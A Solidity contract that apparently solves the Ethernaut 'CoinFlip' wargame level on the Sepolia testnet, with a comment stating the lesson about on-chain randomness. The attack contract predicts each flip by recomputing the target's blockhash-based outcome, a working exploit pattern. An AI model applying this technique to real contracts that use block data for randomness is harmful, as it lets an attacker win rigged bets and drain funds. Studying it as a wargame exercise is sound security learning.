// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @title HackCoinFlip
 * @author Richu A Kuttikattu
 * @notice The contract that solves the CoinFlip level in Ethernaut
 * The contract was deployed at 0x5E14626741411d7Dcbc6Ad08c302C057d25402eC in Sepolia
 * Each of the guesses were generated manually as different transactions, to be part of different blocks.
 *
 * Lesson: Use external sources of randomness in a deterministic system like a blockchain.
 */

contract CoinFlip {
    function flip(bool _guess) public returns (bool) {}
}

contract HackCoinFlip {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    /**
     * @notice the address of the contract instance that ethernaut created
     */
    address coinFlipAddress = 0x4463a7183b3Ae260d737Ad5D94CF9CCf001097b8;

    CoinFlip coinflipInstance;

    constructor() {
        coinflipInstance = CoinFlip(coinFlipAddress);
    }

    function _generateGuess() internal view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;
        return guess;
    }

    function guessTheFlip() public {
        coinflipInstance.flip(_generateGuess());
    }
}
